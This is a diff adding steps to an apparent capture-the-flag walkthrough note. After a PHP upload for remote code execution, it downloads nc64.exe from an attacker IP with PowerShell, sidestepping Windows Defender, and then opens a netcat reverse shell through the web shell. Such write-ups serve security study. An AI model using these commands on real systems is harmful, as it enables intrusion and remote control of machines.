@@ -56,4 +56,10 @@ In php file to be uploaded for Remote Code Execution, `shell_exec` command will 
 ![[Pasted image 20210730115851.png]]
 File which was uploaded has reflected in uploads folder.
 ![[Pasted image 20210730120009.png]]
+Uploading nc64.exe to get reverse shell using command `powershell Invoke-WebRequest "http://10.10.14.105:80/nc64.exe" -OutFile "nc64.exe"` as nishang reverse shell was causing problems with windows defender.
+![[Pasted image 20210730120522.png]]
+## Getting initial reverse shell as www-data
+Got initial reverse shell as www-data using command `nc64.exe%20-e%20powershell%2010.10.14.105%209001` in url after `clarkey`.
+![[Pasted image 20210730120731.png]]
+
 
